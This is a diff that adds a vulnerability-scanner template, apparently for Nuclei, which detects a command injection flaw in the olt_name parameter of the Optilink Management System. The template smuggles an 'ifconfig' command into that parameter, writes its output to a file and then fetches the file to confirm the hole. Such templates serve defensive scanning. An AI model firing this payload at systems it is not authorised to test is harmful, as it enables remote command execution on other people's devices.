@@ -1,0 +1,46 @@
+id: optilink-ms-olt-name-command-injection
+
+info:
+  name: Optilink Management System olt_name Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    Optilink Management System olt_name parameter is vulnerable to command injection, allowing remote attackers to execute arbitrary system commands.
+
+variables:
+  random: "{{rand_base(5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi/fsystem/gene.php?olt_op=1&olt_name=;ifconfig%3E%20{{random}}.txt;%20%23%20"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Fatal error"
+          - "Call to undefined function snmp_get()"
+      - type: status
+        status:
+          - 200
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi/fsystem/{{random}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Link encap:Ethernet"
+          - "HWaddr"
+          - "Mask:"
+      - type: status
+        status:
+          - 200
